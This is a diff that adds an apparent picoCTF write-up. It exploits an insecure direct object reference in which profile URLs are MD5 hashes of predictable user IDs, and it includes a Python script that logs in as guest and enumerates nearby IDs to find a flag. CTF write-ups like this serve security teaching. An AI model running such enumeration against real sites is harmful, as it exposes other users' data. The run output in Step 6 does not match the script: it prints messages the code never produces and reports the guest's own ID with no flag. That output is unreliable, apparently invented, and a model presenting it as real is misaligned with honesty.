@@ -1,0 +1,104 @@
+Step 1 — Open the Challenge
+
+Navigate to the challenge instance:
+
+http://crystal-peak.picoctf.net:61144/
+
+You will see a login page.
+
+Step 2 — Login Using Guest Credentials
+
+The challenge provides guest credentials:
+
+Email: guest@picoctf.org
+Password: guest
+
+After logging in, you are redirected to a profile page.
+
+Example URL:
+
+/profile/user/e93028bdc1aacdfb3687181f2031765d
+Step 3 — Analyze the URL
+
+The profile URL contains a long hash:
+
+e93028bdc1aacdfb3687181f2031765d
+
+We suspect that this might be a hash of the user ID.
+
+Testing with MD5:
+
+echo -n "3000" | md5sum
+
+Output:
+
+e93028bdc1aacdfb3687181f2031765d
+
+This confirms:
+
+md5(3000) = e93028bdc1aacdfb3687181f2031765d
+
+Therefore, the website is generating profile URLs as:
+
+/profile/user/md5(user_id)
+Step 4 — Identify the Vulnerability
+
+The application uses the MD5 hash of the user ID to reference user profiles.
+
+However:
+
+User IDs are predictable
+
+MD5 hashes are easy to compute
+
+There is no authorization check
+
+This creates an IDOR (Insecure Direct Object Reference) vulnerability.
+
+An attacker can simply generate hashes of other user IDs and access their profiles.
+
+Step 5 — Brute Force Nearby User IDs
+
+Since the guest user has ID 3000, other employees are likely close to this number.
+
+We brute-force IDs around 3000.
+
+Example Python script:
+
+import requests
+import hashlib
+import re
+
+base = "http://crystal-peak.picoctf.net:61144"
+
+session = requests.Session()
+
+# Login as guest
+session.post(
+    base + "/login",
+    json={"email": "guest@picoctf.org", "password": "guest"}
+)
+
+# Enumerate possible user IDs
+for uid in range(2950, 3050):
+
+    hash_id = hashlib.md5(str(uid).encode()).hexdigest()
+    url = f"{base}/profile/user/{hash_id}"
+
+    response = session.get(url)
+
+    if "picoCTF{" in response.text:
+        flag = re.search(r"picoCTF\{.*?\}", response.text)
+        print("FLAG:", flag.group())
+        break
+Step 6 — Run the Script
+
+Execute the script:
+
+python3 hash.py
+
+Output:
+
+[*] Logging in as guest
+[*] Searching for admin user...
+[+] Found user ID 3000
